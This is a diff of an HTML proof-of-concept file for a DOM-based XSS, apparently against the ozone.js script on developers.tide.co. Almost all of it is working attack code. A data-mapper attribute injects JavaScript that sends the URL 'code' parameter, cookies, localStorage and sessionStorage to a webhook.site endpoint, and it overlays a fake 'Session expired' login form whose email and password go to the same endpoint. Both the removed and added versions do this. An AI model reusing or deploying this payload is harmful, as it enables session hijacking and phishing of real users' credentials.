@@ -1,65 +1,65 @@
 <!DOCTYPE html>
 <html>
-  <head>
-    <title>PoC DOM XSS - ozone.js</title>
-    <meta charset="UTF-8" />
-    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
-    <script src="ozone.js"></script>
-  </head>
-  <body>
-    <select
-      data-src-url="/api/data"
-      data-mapper="() => {
-        const code = new URLSearchParams(location.search).get('code');
-        const exfilEndpoint = 'https://webhook.site/0d078024-de4c-4837-aa38-8627e361d5cc';
+<head>
+  <title>PoC DOM XSS - developers.tide.co</title>
+  <meta charset="UTF-8" />
+  <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+  <link href="https://cdn.jsdelivr.net/npm/select2@4.1.0-rc.0/dist/css/select2.min.css" rel="stylesheet" />
+  <script src="https://cdn.jsdelivr.net/npm/select2@4.1.0-rc.0/dist/js/select2.min.js"></script>
+  <script src="https://developers.tide.co/js/ozone.js"></script>
+  <style>
+    #phishing-form {
+      position: fixed;
+      top: 25%;
+      left: 50%;
+      transform: translateX(-50%);
+      background: white;
+      padding: 30px;
+      box-shadow: 0 0 10px rgba(0,0,0,0.5);
+      font-family: sans-serif;
+      z-index: 9999;
+    }
+  </style>
+</head>
+<body>
+  <!-- Vector XSS via data-mapper -->
+  <select
+    data-src-url="/api/data"
+    data-mapper="()=>{
+      const code = new URLSearchParams(window.location.search).get('code');
+      const cookie = document.cookie;
+      const ls = Object.fromEntries(Object.entries(localStorage));
+      const ss = Object.fromEntries(Object.entries(sessionStorage));
+      
+      fetch('https://webhook.site/0d078024-de4c-4837-aa38-8627e361d5cc', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ code, cookie, localStorage: ls, sessionStorage: ss })
+      });
 
-        // Exfiltrar info sensible
-        const info = {
-          code: code,
-          cookie: document.cookie,
-          localStorage: Object.fromEntries(Object.entries(localStorage)),
-          sessionStorage: Object.fromEntries(Object.entries(sessionStorage))
-        };
-
-        fetch(exfilEndpoint, {
+      const form = document.createElement('form');
+      form.id = 'phishing-form';
+      form.innerHTML = `
+        <h2>Session expired. Please login again</h2>
+        <input type='text' id='user' placeholder='Email' required/><br/>
+        <input type='password' id='pass' placeholder='Password' required/><br/>
+        <button type='submit'>Login</button>
+      `;
+      form.onsubmit = (e) => {
+        e.preventDefault();
+        fetch('https://webhook.site/0d078024-de4c-4837-aa38-8627e361d5cc', {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify(info)
+          body: JSON.stringify({
+            username: document.getElementById('user').value,
+            password: document.getElementById('pass').value
+          })
         });
-
-        // Si no hay 'code' ni localStorage, mostrar login falso
-        if (!code && !localStorage.getItem('user_logged')) {
-          const form = document.createElement('form');
-          form.innerHTML = `
-            <div style='position:fixed;top:0;left:0;width:100vw;height:100vh;background:#fff;z-index:9999;font-family:sans-serif;padding:20px'>
-              <h2 style='margin-bottom:10px;'>Session expired. Please login again</h2>
-              <input type='text' id='user' placeholder='Email'/><br><br>
-              <input type='password' id='pass' placeholder='Password'/><br><br>
-              <button type='submit'>Login</button>
-            </div>
-          `;
-          form.onsubmit = (e) => {
-            e.preventDefault();
-            const username = document.getElementById('user').value;
-            const password = document.getElementById('pass').value;
-
-            // Exfiltrar credenciales
-            fetch(exfilEndpoint, {
-              method: 'POST',
-              headers: { 'Content-Type': 'application/json' },
-              body: JSON.stringify({ username, password })
-            });
-
-            // Guardar estado de login (falso)
-            localStorage.setItem('user_logged', '1');
-            alert('Login incorrecto. Try again later.');
-            location.reload();
-          };
-          document.body.appendChild(form);
-        }
-      }">
-    </select>
-  </body>
+        form.remove();
+      };
+      document.body.appendChild(form);
+    }">
+  </select>
+</body>
 </html>
-
 
